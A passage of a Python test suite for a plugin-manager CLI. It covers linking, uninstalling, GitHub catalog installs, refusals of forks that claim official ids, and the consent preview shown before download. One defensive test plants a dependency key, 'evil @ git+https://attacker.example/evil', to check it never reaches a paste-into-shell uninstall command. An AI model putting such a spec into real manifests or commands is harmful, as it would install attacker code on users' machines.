def test_cmd_link_existing_id_requires_force(isolated_lockfile, tmp_path):
    work = tmp_path / "dup"
    _write_plugin_dir(work, "dup-plugin")
    assert plugin_cli.cmd_link(argparse.Namespace(path=str(work), force=False)) == 0
    # Re-linking without --force is rejected; with --force it succeeds.
    assert plugin_cli.cmd_link(argparse.Namespace(path=str(work), force=False)) == 1
    assert plugin_cli.cmd_link(argparse.Namespace(path=str(work), force=True)) == 0


def test_cmd_unlink_removes_entry_without_deleting_files(isolated_lockfile, tmp_path):
    work = tmp_path / "work" / "linked"
    _write_plugin_dir(work, "linked")
    plugin_cli.cmd_link(argparse.Namespace(path=str(work), force=False))

    rc = plugin_cli.cmd_unlink(argparse.Namespace(plugin_id="linked"))
    assert rc == 0
    assert "linked" not in plugin_loader.load_lockfile()["plugins"]
    # The author's working tree is untouched.
    assert (work / "cdui.plugin.toml").exists()


def test_cmd_unlink_refuses_non_local_entry(isolated_lockfile):
    lockfile = plugin_loader.load_lockfile()
    lockfile.setdefault("plugins", {})["deep"] = {
        "source_kind": "builtin", "source": "deep", "enabled": True,
    }
    plugin_loader.save_lockfile(lockfile)

    rc = plugin_cli.cmd_unlink(argparse.Namespace(plugin_id="deep"))
    assert rc == 1
    assert "deep" in plugin_loader.load_lockfile()["plugins"]  # refused to drop it


def test_cmd_unlink_missing_plugin_errors(isolated_lockfile):
    assert plugin_cli.cmd_unlink(argparse.Namespace(plugin_id="nope")) == 1


# ── uninstall: the files go first, or nothing goes ─────────────────────────

def test_a_downloaded_pack_whose_files_survive_stays_installed(
    isolated_lockfile, monkeypatch, capsys
):
    """A failed delete abandons the uninstall instead of half-doing it.

    Windows holds open files, so this is the ordinary failure, not an exotic
    one. Popping the lockfile entry anyway would claim the pack is gone while
    its directory keeps sitting in the user data dir -- and with nothing left
    pointing at it, nothing would ever clean it up or load it again on
    purpose. So the entry stays, and the command says why and fails.
    """
    plugin_dir = isolated_lockfile / "ghost"
    _write_plugin_dir(plugin_dir, "ghost")
    lockfile = plugin_loader.load_lockfile()
    lockfile.setdefault("plugins", {})["ghost"] = {
        "source_kind": "github_url",
        "source": "alice/ghost",
        "url": "https://github.com/alice/ghost",
        "enabled": True,
    }
    plugin_loader.save_lockfile(lockfile)

    def _refuse(*_args, **_kwargs):
        raise OSError(13, "used by another process")

    monkeypatch.setattr(lifecycle.shutil, "rmtree", _refuse)

    outcome = lifecycle.uninstall_plugin("ghost")
    assert outcome is not None
    assert outcome.removed is False
    assert outcome.tombstoned is False
    assert outcome.files_removed is False
    assert "used by another process" in outcome.error
    # The directory it tried to delete travels with the outcome, so the CLI
    # line below prints where the files still are instead of rebuilding the
    # path from the id.
    assert outcome.directory == plugin_dir
    assert "ghost" in plugin_loader.load_lockfile()["plugins"]
    assert plugin_dir.is_dir()

    # And the CLI reports it the way it always has: the failing path, the
    # reason, and a non-zero exit code.
    capsys.readouterr()
    assert plugin_cli.main(["uninstall", "ghost"]) == 1
    reported = capsys.readouterr().err
    assert f"Failed to remove {plugin_dir}" in reported
    assert "used by another process" in reported
    assert "ghost" in plugin_loader.load_lockfile()["plugins"]


def test_a_downloaded_pack_is_uninstalled_when_its_files_do_go(
    isolated_lockfile, capsys
):
    """The other half of the rule, so the guard above cannot pass by
    refusing every uninstall."""
    plugin_dir = isolated_lockfile / "ghost"
    _write_plugin_dir(plugin_dir, "ghost")
    lockfile = plugin_loader.load_lockfile()
    lockfile.setdefault("plugins", {})["ghost"] = {
        "source_kind": "github_url",
        "source": "alice/ghost",
        "enabled": True,
    }
    plugin_loader.save_lockfile(lockfile)

    assert plugin_cli.main(["uninstall", "ghost"]) == 0
    assert "ghost" not in plugin_loader.load_lockfile()["plugins"]
    assert not plugin_dir.exists()
    # Not a built-in pack, so no tombstone: nothing re-adds a URL install.
    assert plugin_loader.removed_ids(plugin_loader.load_lockfile()) == set()


def test_a_dep_name_no_install_would_accept_stays_out_of_the_command(
    isolated_lockfile
):
    """``uninstall_command`` is a line the user is invited to paste into a
    shell, built out of an untrusted manifest table. A key like ``evil @
    git+https://...`` is exactly what ``deps.dep_specs`` refuses to install,
    so it must not travel from that manifest into somebody's terminal by the
    other door -- and a package that could never have been installed cannot
    have been left behind either."""
    plugin_dir = isolated_lockfile / "ghost"
    _write_plugin_dir(plugin_dir, "ghost")
    (plugin_dir / "cdui.plugin.toml").write_text(
        dedent("""\
            [plugin]
            id = "ghost"
            name = "Local ghost"
            version = "0.1.0"
            schema_version = 1

            [python_deps]
            tabulate = ">=0.9"
            "evil @ git+https://attacker.example/evil" = ""
            """),
        encoding="utf-8",
    )
    lockfile = plugin_loader.load_lockfile()
    lockfile.setdefault("plugins", {})["ghost"] = {
        "source_kind": "github_url", "source": "alice/ghost", "enabled": True,
    }
    plugin_loader.save_lockfile(lockfile)

    outcome = lifecycle.uninstall_plugin("ghost")
    assert outcome is not None
    assert outcome.python_deps_left == ("tabulate",)
    assert outcome.uninstall_command.endswith(" tabulate")
    assert "git+" not in outcome.uninstall_command


def test_cmd_reload_no_server_returns_zero(isolated_lockfile):
    # _backend_reload stubbed to False (no server) — reload is a graceful no-op.
    assert plugin_cli.cmd_reload(argparse.Namespace()) == 0


def test_link_unlink_reload_parser_wired():
    parser = plugin_cli.build_parser()
    a = parser.parse_args(["link", "/some/path"])
    assert a._func is plugin_cli.cmd_link and a.path == "/some/path" and a.force is False
    a = parser.parse_args(["link", "/p", "--force"])
    assert a.force is True
    a = parser.parse_args(["unlink", "foo"])
    assert a._func is plugin_cli.cmd_unlink and a.plugin_id == "foo"
    a = parser.parse_args(["reload"])
    assert a._func is plugin_cli.cmd_reload


# ── dev (watch mode) ───────────────────────────────────────────────────────

def test_scan_plugin_files_covers_relevant_dirs(tmp_path):
    root = tmp_path / "p"
    _write_plugin_dir(root, "p")  # manifest + nodes/__init__.py
    (root / "frontend").mkdir()
    (root / "frontend" / "index.js").write_text("export default function(){}", encoding="utf-8")
    (root / "README.md").write_text("ignored", encoding="utf-8")
    (root / "nodes" / "__pycache__").mkdir()
    (root / "nodes" / "__pycache__" / "x.pyc").write_text("x", encoding="utf-8")

    keys = {Path(k).name for k in plugin_cli._scan_plugin_files(root)}
    assert {"cdui.plugin.toml", "__init__.py", "index.js"} <= keys
    assert "README.md" not in keys   # not a reload-relevant dir
    assert "x.pyc" not in keys       # __pycache__ ignored


def test_scan_plugin_files_detects_new_file(tmp_path):
    root = tmp_path / "p"
    _write_plugin_dir(root, "p")
    before = plugin_cli._scan_plugin_files(root)
    (root / "nodes" / "extra.py").write_text("# new node", encoding="utf-8")
    after = plugin_cli._scan_plugin_files(root)
    assert after != before
    assert any(Path(k).name == "extra.py" for k in after)


def test_cmd_dev_once_links_and_returns_zero(isolated_lockfile, tmp_path):
    root = tmp_path / "devplug"
    _write_plugin_dir(root, "devplug")
    rc = plugin_cli.cmd_dev(argparse.Namespace(path=str(root), once=True, interval=1.0))
    assert rc == 0
    entry = plugin_loader.load_lockfile()["plugins"]["devplug"]
    assert entry["source_kind"] == "local"
    assert Path(entry["path"]) == root.resolve()


def test_cmd_dev_once_bad_dir_returns_one(isolated_lockfile, tmp_path):
    empty = tmp_path / "empty"
    empty.mkdir()
    rc = plugin_cli.cmd_dev(argparse.Namespace(path=str(empty), once=True, interval=1.0))
    assert rc == 1
    assert plugin_loader.load_lockfile()["plugins"] == {}


def test_dev_parser_wired():
    parser = plugin_cli.build_parser()
    a = parser.parse_args(["dev", "/p"])
    assert a._func is plugin_cli.cmd_dev and a.path == "/p" and a.once is False
    a = parser.parse_args(["dev", "/p", "--once", "--interval", "0.5"])
    assert a.once is True and a.interval == 0.5


# ── the official GitHub packs in the catalog ───────────────────────────────
#
# `registry.json` advertises three repositories the CodefyUI org publishes.
# They are catalog names like any other -- `cdui plugin install graph-copilot`
# -- but everything behind the name is different: the pack is downloaded
# rather than activated in place, so the install is a consent decision and
# `cdui plugin sync` must never make it on the user's behalf.

OFFICIAL_GITHUB_PACKS = {
    "graph-copilot": "CodefyUI/CodefyUI-Plugin-Graph-Copilot",
    "self-learning": "CodefyUI/CodefyUI-Plugin-Self-Learning",
    "official-template": "CodefyUI/CodefyUI-Plugin-Official",
}

_TEMPLATE_MANIFEST = dedent("""\
    [plugin]
    id = "official-template"
    name = "Official Template"
    version = "0.1.0"
    schema_version = 1
    """)


def _out(capsys) -> str:
    captured = capsys.readouterr()
    return captured.out + captured.err


def _tarball_of(root_name: str, files: dict[str, str], dest: Path) -> None:
    """Pack ``{relative path: text}`` under one top-level directory -- the
    shape ``_install_github`` expects from a GitHub codeload tarball."""
    with tarfile.open(dest, "w:gz") as tf:
        for rel, text in files.items():
            data = text.encode("utf-8")
            member = tarfile.TarInfo(f"{root_name}/{rel}")
            member.size = len(data)
            tf.addfile(member, io.BytesIO(data))


@pytest.fixture
def fake_github(monkeypatch):
    """Serve a synthetic tarball instead of reaching GitHub.

    An install now reaches GitHub twice, through two different modules, and
    the fixture has to answer both:

    * ``inspect_github`` resolves the ref and reads the manifest at that
      commit -- both through ``app.core.plugins.github``, which is where the
      inspection lives, so those two are patched THERE. (They used to be
      patched on ``plugin_cli``, and that patch is now on a name nothing
      calls: the CLI reads the manifest through the shared inspection.)
    * the download is still ``plugin_cli.download_tarball``. The flow takes a
      GitHub client and the CLI hands it this module, precisely so that
      replacing the name here replaces what an install fetches. It is called
      with ``cancel_check`` and ``progress`` keywords, hence ``**_kw``.
    """
    def _make(files: dict[str, str] | None = None) -> None:
        payload = {"cdui.plugin.toml": _TEMPLATE_MANIFEST} if files is None else files
        monkeypatch.setattr(
            "app.core.plugins.github.resolve_sha", lambda o, r, ref: "0" * 40
        )
        monkeypatch.setattr(
            "app.core.plugins.github.fetch_manifest_text",
            lambda o, r, sha: payload["cdui.plugin.toml"],
        )
        monkeypatch.setattr(
            plugin_cli,
            "download_tarball",
            lambda owner, repo, sha, dest, **_kw: _tarball_of(
                f"{repo}-main", payload, dest
            ),
        )

    return _make


def _install_args(**overrides) -> argparse.Namespace:
    base = dict(
        force=False,
        no_confirm=True,
        trust_author=False,
        accept_capabilities=False,
        prior_capabilities=[],
    )
    base.update(overrides)
    return argparse.Namespace(**base)


def _cmd_install_args(*sources: str) -> argparse.Namespace:
    return argparse.Namespace(
        source=list(sources),
        force=False,
        no_confirm=True,
        trust_author=False,
        accept_capabilities=False,
    )


def _manifest_declaring(plugin_id: str) -> str:
    return dedent(f"""\
        [plugin]
        id = "{plugin_id}"
        name = "Claimed"
        version = "0.1.0"
        schema_version = 1
        """)


def test_a_github_catalog_id_parses_as_a_catalog_name():
    """The whole point of the row: the id is a name a person can type."""
    for pack_id in OFFICIAL_GITHUB_PACKS:
        assert plugin_cli.parse_source(pack_id) == ("catalog", pack_id, "", "")
    # Case-insensitive, like every other catalog name.
    assert plugin_cli.parse_source("Graph-Copilot") == (
        "catalog", "graph-copilot", "", "",
    )


def test_the_catalog_carries_the_repository_of_each_official_pack():
    for pack_id, repo in OFFICIAL_GITHUB_PACKS.items():
        entry = plugin_cli.catalog_entry(pack_id)
        assert entry is not None, f"{pack_id} was dropped by validate_catalog"
        assert entry.kind == "github"
        assert entry.repo == repo
        assert entry.ref == ""      # no tags yet: the default branch
        assert entry.official is True


def test_cmd_install_sends_a_github_catalog_entry_to_the_repository_installer(
    isolated_lockfile, monkeypatch
):
    """`install graph-copilot` has to fetch the repository the catalog names.
    Before the dispatch existed, every catalog name went to the built-in
    installer, which looked for a directory this release does not ship."""
    calls: list[tuple] = []

    def _record(owner, repo, ref, args, lockfile, *, catalog_id=None):
        calls.append((owner, repo, ref, catalog_id))
        return 0

    def _never(*_a, **_k):  # pragma: no cover - only runs on a bug
        raise AssertionError("a github row must not take the built-in path")

    monkeypatch.setattr(plugin_cli, "_install_github", _record)
    monkeypatch.setattr(plugin_cli, "_install_catalog", _never)

    assert plugin_cli.cmd_install(_cmd_install_args("graph-copilot")) == 0
    assert calls == [
        ("CodefyUI", "CodefyUI-Plugin-Graph-Copilot", "", "graph-copilot")
    ]


def test_cmd_install_still_activates_a_builtin_catalog_entry_in_place(
    isolated_lockfile, monkeypatch
):
    """The other half of the same dispatch, unchanged: a builtin row must not
    start downloading anything."""
    seen: list[str] = []

    def _record(plugin_id, args, lockfile):
        seen.append(plugin_id)
        return 0

    def _never(*_a, **_k):  # pragma: no cover - only runs on a bug
        raise AssertionError("a builtin pack is activated in place, not fetched")

    monkeypatch.setattr(plugin_cli, "_install_catalog", _record)
    monkeypatch.setattr(plugin_cli, "_install_github", _never)

    assert plugin_cli.cmd_install(_cmd_install_args("stats")) == 0
    assert seen == ["stats"]


def test_install_github_keeps_the_positional_arguments_project_restore_uses():
    """``scripts/project.py`` restores a project's pins with
    ``_install_github(owner, repo, ref, inst_args, lockfile)``. ``catalog_id``
    was added after those five and keyword-only so that call stays valid."""
    import inspect

    params = list(inspect.signature(plugin_cli._install_github).parameters.values())
    assert [p.name for p in params[:5]] == [
        "owner", "repo", "ref", "args", "lockfile",
    ]
    assert all(p.kind is inspect.Parameter.POSITIONAL_OR_KEYWORD for p in params[:5])
    assert params[5].name == "catalog_id"
    assert params[5].kind is inspect.Parameter.KEYWORD_ONLY
    assert params[5].default is None


@pytest.mark.parametrize("recorded", ["graph-copilot", None])
def test_an_update_keeps_the_catalog_row_the_install_recorded(
    isolated_lockfile, monkeypatch, recorded
):
    """``cdui plugin install <name>`` writes down which catalog row a pack
    came from so a later reader can tell the catalog's own pack from free
    text carrying the same id. ``update`` re-installs from the repository and
    rewrites that entry -- and dropped the row on the way, quietly demoting
    every official plugin to third-party at its first update.

    Nothing recorded stays nothing claimed: "official" is a claim only the
    catalog is entitled to make, and an update must not invent one.
    """
    calls: list[tuple] = []

    def _record(owner, repo, ref, args, lockfile, *, catalog_id=None,
                expected_id=None):
        calls.append((owner, repo, ref, catalog_id, expected_id))
        return 0

    monkeypatch.setattr(plugin_cli, "_install_github", _record)
    # The one network call ``cmd_update`` makes before it hands over.
    monkeypatch.setattr(plugin_cli, "resolve_sha", lambda o, r, ref: "b" * 40)
    entry = {
        "source_kind": "github_url",
        "source": "CodefyUI/CodefyUI-Plugin-Graph-Copilot",
        "url": "https://github.com/CodefyUI/CodefyUI-Plugin-Graph-Copilot",
        "ref": "", "sha": "a" * 40, "capabilities": [],
        "trusted_modules": [], "enabled": True,
    }
    if recorded is not None:
        entry["catalog_id"] = recorded
    plugin_cli.save_lockfile({"schema": 1, "plugins": {"graph-copilot": entry}})

    rc = plugin_cli.cmd_update(argparse.Namespace(plugin_id="graph-copilot"))

    assert rc == 0
    # ``expected_id`` is the lockfile key, always: it is what refuses a
    # repository that has renamed its plugin since the install.
    assert calls == [
        ("CodefyUI", "CodefyUI-Plugin-Graph-Copilot", "", recorded,
         "graph-copilot")
    ]


def test_an_update_whose_repository_renamed_the_plugin_is_refused(
    isolated_lockfile, fake_github, monkeypatch, capsys
):
    """``update`` carries ``--force``, so a repository that has renamed its
    plugin would install a DIFFERENT pack under a command the user read as
    "update this one" -- and if the new name belongs to a pack they also
    have, replace that one and inherit the capabilities IT was granted.

    Refused instead, with both ids named. Installing the new plugin stays
    available as the deliberate act it is.
    """
    fake_github({"cdui.plugin.toml": _manifest_declaring("something-else")})
    monkeypatch.setattr(plugin_cli, "resolve_sha", lambda o, r, ref: "b" * 40)
    before = {"schema": 1, "plugins": {"graph-copilot": {
        "source_kind": "github_url",
        "source": "CodefyUI/CodefyUI-Plugin-Graph-Copilot",
        "url": "https://github.com/CodefyUI/CodefyUI-Plugin-Graph-Copilot",
        "ref": "", "sha": "a" * 40, "capabilities": ["network"],
        "trusted_modules": [], "enabled": True,
    }}}
    plugin_cli.save_lockfile(before)

    rc = plugin_cli.cmd_update(argparse.Namespace(plugin_id="graph-copilot"))

    assert rc == 1
    assert "something-else" in _out(capsys)
    assert plugin_cli.load_lockfile() == before
    assert not (isolated_lockfile / "something-else").exists()


def test_the_repository_the_catalog_names_may_claim_its_catalog_id(
    isolated_lockfile, fake_github
):
    """The refusal this rule replaced would have made the official pack the
    one thing the catalog advertises and nobody can install: its manifest
    declares the id the catalog lists it under, which used to be enough to
    refuse it."""
    fake_github({
        "cdui.plugin.toml": _TEMPLATE_MANIFEST,
        "nodes/hello.py": "VALUE = 1\n",
    })
    rc = plugin_cli._install_github(
        "CodefyUI", "CodefyUI-Plugin-Official", "",
        _install_args(), plugin_loader.load_lockfile(),
    )
    assert rc == 0
    entry = plugin_loader.load_lockfile()["plugins"]["official-template"]
    assert entry["source_kind"] == "github_url"
    # This call did not come from the catalog, so it claims no catalog row --
    # the key is absent rather than null, which is the shape every free-text
    # install has always written.
    assert "catalog_id" not in entry


def test_a_fork_may_not_claim_the_catalog_id_of_the_pack_it_forked(
    isolated_lockfile, fake_github, capsys
):
    """Same manifest, a different repository. The id is what the lockfile,
    the catalog card and the ``/api/plugins/<id>`` route all key on, so a fork
    installing under it would quietly take the official pack's place."""
    fake_github({
        "cdui.plugin.toml": _TEMPLATE_MANIFEST,
        "nodes/hello.py": "VALUE = 1\n",
    })
    rc = plugin_cli._install_github(
        "someone", "fork", "", _install_args(), plugin_loader.load_lockfile()
    )
    assert rc == 1
    assert plugin_loader.load_lockfile()["plugins"] == {}
    assert not (isolated_lockfile / "official-template").exists()
    # The refusal names the repository that may use the id, because "reserved"
    # on its own leaves the reader with nothing to do about it.
    assert "CodefyUI/CodefyUI-Plugin-Official" in _out(capsys)


@pytest.mark.parametrize(
    ("plugin_id", "why"),
    [
        ("stats", "a pack that ships with CodefyUI"),
        ("install", "a route under /api/plugins/"),
    ],
)
def test_a_repository_may_not_claim_a_shipped_pack_or_a_route_name(
    isolated_lockfile, fake_github, capsys, monkeypatch, plugin_id, why
):
    """Neither of these is negotiable by repository: the built-in directory
    would decide which pack loaded, and the router would decide which
    ``/api/plugins/install`` answered. Asked of the repository that IS
    allowed to claim its own catalog id, so what is being refused here is the
    id rather than the owner."""
    monkeypatch.setenv("CODEFYUI_LANG", "en")
    fake_github({"cdui.plugin.toml": _manifest_declaring(plugin_id)})
    rc = plugin_cli._install_github(
        "CodefyUI", "CodefyUI-Plugin-Official", "",
        _install_args(), plugin_loader.load_lockfile(),
    )
    assert rc == 1
    assert plugin_loader.load_lockfile()["plugins"] == {}
    printed = _out(capsys)
    assert plugin_id in printed
    assert why in printed


def test_an_install_from_the_catalog_records_which_row_it_came_from(
    isolated_lockfile, fake_github
):
    """``catalog_id`` is how a later reader tells the catalog's own pack from
    free text that happens to carry the same id."""
    fake_github({
        "cdui.plugin.toml": _TEMPLATE_MANIFEST,
        "nodes/hello.py": "VALUE = 1\n",
    })
    rc = plugin_cli._install_github(
        "CodefyUI", "CodefyUI-Plugin-Official", "",
        _install_args(), plugin_loader.load_lockfile(),
        catalog_id="official-template",
    )
    assert rc == 0
    entry = plugin_loader.load_lockfile()["plugins"]["official-template"]
    assert entry["catalog_id"] == "official-template"


def test_a_catalog_row_whose_repository_declares_another_id_is_refused(
    isolated_lockfile, fake_github, capsys, monkeypatch
):
    """The catalog names an id AND a repository; the repository's manifest
    names an id too. When they drift apart the catalog is describing one pack
    and fetching another -- and every card, lockfile key and
    ``/api/plugins/<id>`` URL afterwards would use the manifest's id while
    the user was reading the catalog's card. Nothing is written and the
    refusal names both ids, because this is a bug in the catalog and the two
    ids are what gets it fixed."""
    monkeypatch.setenv("CODEFYUI_LANG", "en")
    fake_github({
        "cdui.plugin.toml": _manifest_declaring("renamed-plugin"),
        "nodes/hello.py": "VALUE = 1\n",
    })
    rc = plugin_cli._install_github(
        "CodefyUI", "CodefyUI-Plugin-Official", "",
        _install_args(), plugin_loader.load_lockfile(),
        catalog_id="official-template",
    )
    assert rc == 1
    assert plugin_loader.load_lockfile()["plugins"] == {}
    assert not (isolated_lockfile / "renamed-plugin").exists()
    assert not (isolated_lockfile / "official-template").exists()
    assert not (isolated_lockfile / ".staging").exists()
    printed = _out(capsys)
    assert "official-template" in printed and "renamed-plugin" in printed


def test_search_lists_the_github_packs_and_marks_them_official(
    isolated_lockfile, capsys
):
    assert plugin_cli.cmd_search(argparse.Namespace(query=None)) == 0
    printed = _out(capsys)

    def _line_for(pack_id: str) -> str:
        return next(
            line for line in printed.splitlines()
            if line.strip().startswith(pack_id)
        )

    for pack_id in OFFICIAL_GITHUB_PACKS:
        assert "[github, official]" in _line_for(pack_id), pack_id
    # A built-in pack is not a download and must not be labelled as one.
    assert "[github" not in _line_for("stats")


def test_search_finds_a_github_pack_by_its_repository_name(
    isolated_lockfile, capsys
):
    """Someone with the GitHub page open has the repository name in front of
    them and no reason to guess the id the catalog files it under."""
    assert plugin_cli.cmd_search(
        argparse.Namespace(query="CodefyUI-Plugin-Self-Learning")
    ) == 0
    printed = _out(capsys)
    assert "self-learning" in printed
    assert "graph-copilot" not in printed


def test_info_prints_the_catalog_row_and_then_the_live_repository(
    isolated_lockfile, monkeypatch, capsys
):
    monkeypatch.setattr(plugin_cli, "resolve_sha", lambda o, r, ref: "c" * 40)
    monkeypatch.setattr(
        "app.core.plugins.github.fetch_manifest_text",
        lambda o, r, sha: _manifest_declaring("graph-copilot"),
    )
    assert plugin_cli.cmd_info(
        argparse.Namespace(source_or_id="graph-copilot")
    ) == 0
    printed = _out(capsys)
    assert "CodefyUI/CodefyUI-Plugin-Graph-Copilot" in printed
    assert "https://github.com/CodefyUI/CodefyUI-Plugin-Graph-Copilot" in printed
    assert "copilot, llm, agent" in printed          # the catalog's tags
    assert "official" in printed
    assert "cccccccccccc" in printed                 # the live sha


def test_info_still_answers_from_the_catalog_when_github_is_unreachable(
    isolated_lockfile, monkeypatch, capsys
):
    """The catalog half is printed first for exactly this case: a student on
    a school network still learns what the pack is and where it comes from."""
    def _boom(*_a, **_k):
        raise RuntimeError("GitHub API 403: rate limited")

    monkeypatch.setattr(plugin_cli, "resolve_sha", _boom)
    assert plugin_cli.cmd_info(
        argparse.Namespace(source_or_id="self-learning")
    ) == 1
    printed = _out(capsys)
    assert "CodefyUI/CodefyUI-Plugin-Self-Learning" in printed
    assert "rate limited" in printed


def test_a_catalog_row_the_validator_dropped_is_refused_by_name(
    isolated_lockfile, monkeypatch, capsys
):
    """The two readers disagree on purpose, and the gap has to be spoken.

    ``parse_source`` matches the RAW registry, so a name the file lists is
    never "unknown"; the installer dispatches on a VALIDATED row, so a github
    entry it acts on really does carry an ``owner/repo``. A row in one and
    not the other is named but not installable. Falling through to the
    built-in installer -- which is what "not a github row" used to mean --
    would report "no manifest on disk" for an entry whose actual problem is a
    missing ``repo`` field two lines away.
    """
    monkeypatch.setenv("CODEFYUI_LANG", "en")
    monkeypatch.setattr(plugin_cli, "load_catalog", lambda: {
        "schema": 1,
        "plugins": {"broken": {"kind": "github", "name": "Broken"}},   # no repo
    })
    # The premise: the name still parses as a catalog source.
    assert plugin_cli.parse_source("broken") == ("catalog", "broken", "", "")
    assert plugin_cli.catalog_entry("broken") is None

    assert plugin_cli.cmd_install(_cmd_install_args("broken")) == 1
    assert plugin_loader.load_lockfile()["plugins"] == {}
    printed = _out(capsys)
    assert "broken" in printed and "malformed" in printed

    assert plugin_cli.cmd_info(argparse.Namespace(source_or_id="broken")) == 1
    assert "malformed" in _out(capsys)


def test_sync_never_proposes_a_github_catalog_entry(isolated_lockfile, capsys):
    """#175's line, held: sync activates what the release already put on
    disk. Downloading someone else's repository is a consent decision, and
    nothing that installs without being asked may make it."""
    pending = core_catalog.available_builtin_packs(
        plugin_cli.load_catalog(), {"plugins": {}}
    )
    pending_ids = {pack_id for pack_id, _ in pending}
    assert pending_ids, "the built-in packs are still pending on an empty lockfile"
    assert not (pending_ids & set(OFFICIAL_GITHUB_PACKS))

    assert plugin_cli.cmd_sync(
        argparse.Namespace(dry_run=True, prune=False, yes=False)
    ) == 0
    printed = _out(capsys)
    for pack_id in OFFICIAL_GITHUB_PACKS:
        assert pack_id not in printed


# ── the install, run through the shared flow ───────────────────────────────
#
# `cdui plugin install` and the Plugin Center are two front ends over
# `app.core.plugins.flows.install_plugin_live`. What is tested here is the
# half that stays in the CLI: what a person is shown BEFORE agreeing, which
# refusals happen before a byte is fetched, and what the flow's three
# non-ordinary endings look like from a shell -- an exit code each.

_PREVIEW_MANIFEST = dedent("""\
    [plugin]
    id = "official-template"
    name = "Preview Pack"
    version = "0.4.2"
    description = "Everything a card would show."
    schema_version = 1

    [frontend]
    entry = "frontend/index.js"

    [python_deps]
    tabulate = ">=0.9"

    [security]
    capabilities = ["network"]
    allowed_modules = ["subprocess"]
    """)

_PREVIEW_FILES = {
    "cdui.plugin.toml": _PREVIEW_MANIFEST,
    "nodes/hello.py": "VALUE = 1\n",
    "frontend/index.js": "export default {};\n",
}


def _official(args, lockfile=None) -> int:
    """Install the repository the catalog names, under its own id."""
    return plugin_cli._install_github(
        "CodefyUI", "CodefyUI-Plugin-Official", "", args,
        plugin_loader.load_lockfile() if lockfile is None else lockfile,
    )


def _pip_succeeds(monkeypatch) -> list[list[str]]:
    """Fake ``run_pip``: record the specs, install nothing, exit 0."""
    seen: list[list[str]] = []

    def _run_pip(specs, *, constraints_path, emit, cancel_check, cwd, tail=None):
        seen.append(list(specs))
        return 0

    monkeypatch.setattr("app.core.packs.runner.run_pip", _run_pip)
    return seen


def test_the_preview_is_printed_before_anything_is_downloaded(
    isolated_lockfile, fake_github, monkeypatch, capsys
):
    """The reason the manifest is read at a pinned commit first.

    "Install this?" is a question nobody can answer from an ``owner/repo``,
    and this command used to ask it with a URL on the screen and nothing
    else -- then fetch the repository, and only afterwards print what it had
    already spent a minute downloading. Every fact a person needs to answer
    has to be on the screen before the download starts, so the fake download
    announces itself into the same stream and every fact is asserted to come
    before it.
    """
    monkeypatch.setenv("CODEFYUI_LANG", "en")
    fake_github(_PREVIEW_FILES)
    _pip_succeeds(monkeypatch)
    served = plugin_cli.download_tarball

    def _announced(owner, repo, sha, dest, **kwargs):
        print("<<fetching the repository>>")
        served(owner, repo, sha, dest, **kwargs)

    monkeypatch.setattr(plugin_cli, "download_tarball", _announced)

    assert _official(_install_args(
        accept_capabilities=True, trust_author=True)) == 0

    printed = capsys.readouterr().out
    fetched = printed.index("<<fetching the repository>>")
    for fact in (
        "Preview Pack",                  # what it is
        "0.4.2",                         # which version
        "Everything a card would show.",
        "subprocess",                    # the modules it wants the gate off for
        "tabulate>=0.9",                 # what it would add to the venv
        "JavaScript",                    # ... and that it runs code in the browser
        "network",                       # the capability being granted
    ):
        assert 0 <= printed.index(fact) < fetched, fact


def test_no_confirm_does_not_buy_the_module_list_the_manifest_asks_for(
    isolated_lockfile, fake_github, monkeypatch, capsys
):
    """``-y`` answers "install this". ``allowed_modules`` is a second question.

    It switches the AST gate off by name, which is a decision about the
    AUTHOR rather than about the code, and it is refused before the
    repository is fetched -- so a plugin nobody agreed to costs no bandwidth
    at all.
    """
    monkeypatch.setenv("CODEFYUI_LANG", "en")
    fake_github(_PREVIEW_FILES)

    def _never(*_a, **_k):  # pragma: no cover - only runs on a bug
        raise AssertionError("a refused install must not download anything")

    monkeypatch.setattr(plugin_cli, "download_tarball", _never)

    assert _official(_install_args(
        no_confirm=True, accept_capabilities=True)) == 1
    printed = _out(capsys)
    assert "subprocess" in printed
    assert "--trust-author" in printed
    assert plugin_loader.load_lockfile()["plugins"] == {}


def test_a_plugin_you_already_have_is_refused_before_it_is_fetched(
    isolated_lockfile, fake_github, monkeypatch, capsys
):
    """The offer is "reinstall it with --force", and it costs nothing to make.

    This refusal used to arrive after the download, the unpack and the
    security scan -- a minute of somebody's connection spent on an install
    that was never going to happen.
    """
    monkeypatch.setenv("CODEFYUI_LANG", "en")
    fake_github({
        "cdui.plugin.toml": _TEMPLATE_MANIFEST,
        "nodes/hello.py": "VALUE = 1\n",
    })
    assert _official(_install_args()) == 0
    installed_at = plugin_loader.load_lockfile()[
        "plugins"]["official-template"]["installed_at"]
    capsys.readouterr()

    def _never(*_a, **_k):  # pragma: no cover - only runs on a bug
        raise AssertionError("an install that is refused must not download")

    monkeypatch.setattr(plugin_cli, "download_tarball", _never)

    assert _official(_install_args()) == 1
    printed = _out(capsys)
    assert "official-template" in printed and "--force" in printed
    # And the entry that was there is the entry that is still there.
    assert plugin_loader.load_lockfile()[
        "plugins"]["official-template"]["installed_at"] == installed_at


def test_declining_the_prompt_is_exit_0_and_downloads_nothing(
    isolated_lockfile, fake_github, monkeypatch, capsys
):
    """"No" is a complete answer, not a failure to carry out the command --
    the same rule ``cdui plugin sync`` follows for its own prompt. This is
    what the exit-code table promises, and what a script wrapping the CLI
    branches on: a 1 here would read as "the install broke"."""
    monkeypatch.setenv("CODEFYUI_LANG", "en")
    fake_github(_PREVIEW_FILES)
    monkeypatch.setattr("builtins.input", lambda _prompt: "n")

    def _never(*_a, **_k):  # pragma: no cover - only runs on a bug
        raise AssertionError("a declined install must not download anything")

    monkeypatch.setattr(plugin_cli, "download_tarball", _never)

    assert _official(_install_args(no_confirm=False)) == 0
    printed = _out(capsys)
    assert "Cancelled" in printed
    # It was asked AFTER the preview and before anything moved.
    assert "Preview Pack" in printed
    assert plugin_loader.load_lockfile()["plugins"] == {}
    assert not (isolated_lockfile / "official-template").exists()


def _records_reload(monkeypatch) -> list[str]:
    """Replace ``isolated_lockfile``'s reload stub with a counting one.

    The fixture's stub answers "no server" and records nothing, so deleting
    the call after a successful install kept the whole suite green -- and a
    plugin that installs without the running server being told about it does
    not appear until the next `cdui start`.
    """
    asked: list[str] = []

    def _reload() -> bool:
        asked.append("reload")
        return False

    monkeypatch.setattr(plugin_cli, "_backend_reload", _reload)
    return asked


def test_a_finished_install_asks_the_server_to_pick_the_plugin_up(
    isolated_lockfile, fake_github, monkeypatch, capsys
):
    """Not a step of the install -- the flow finishes on disk -- but the
    difference between a plugin you can use now and one that appears at the
